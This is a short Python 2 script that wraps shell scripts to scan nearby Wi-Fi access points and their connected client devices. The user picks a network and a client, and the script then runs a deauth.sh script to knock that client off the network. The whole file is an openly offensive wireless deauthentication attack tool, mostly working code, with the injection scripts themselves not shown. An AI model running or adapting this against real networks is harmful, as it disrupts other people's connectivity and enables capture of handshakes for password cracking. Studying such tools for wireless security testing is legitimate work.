import os
import csv
from subprocess import Popen,PIPE
import subprocess
import time
essid=[]
bssid=[]
index=[]
channel=[]
encryption=[]

os.chmod('scanbssid.sh',0o755)
subprocess.Popen(['bash','scanbssid.sh'])
time.sleep(10)
with open('temp/dump-01.kismet.csv') as f:
    reader = csv.reader(f,delimiter=';') 
    next(f);
    for row in reader: # read a row as {column1: value1, column2: value2,...}
		e=row[2]
		b=row[3]
		c=row[5]
		en=row[7]
		essid.append(e)
		bssid.append(b)
		channel.append(c)
		encryption.append(en)
		index.append(row[0])

for i in xrange(0, len(index)):
	print i," ",essid[i],"          ",bssid[i],"     ",channel[i],"  ",encryption[i]  

adfold=0
try:
    adfold = int(raw_input("Enter Index: "))
    #print adf+2
except ValueError:
    print "Not a number"

os.chmod('scannetworks.sh',0o755)
subprocess.Popen(['bash','scannetworks.sh',str(essid[adfold]),str(bssid[adfold]),str(channel[adfold])])

time.sleep(10)
stationmac=[]

with open('temp/dump-02.csv') as f:
    reader = csv.reader(f,delimiter=',') 
    next(f);
    next(f);
    next(f);
    next(f);
    next(f);
    for row in reader: # read a row as {column1: value1, column2: value2,...}
		if row:
			sm=row[0]
			stationmac.append(sm)
			#print(row[0])


for i in xrange(0, len(stationmac)):
	print i,bssid[adfold],stationmac[i]  

adf=0
nd=0

try:
    adf = int(raw_input("Enter Index: "))
except ValueError:
    print "Not a number"

os.chmod('deauth.sh',0o755)
subprocess.Popen(['bash','deauth.sh',str(nd),str(bssid[adfold]),str(stationmac[adf])])
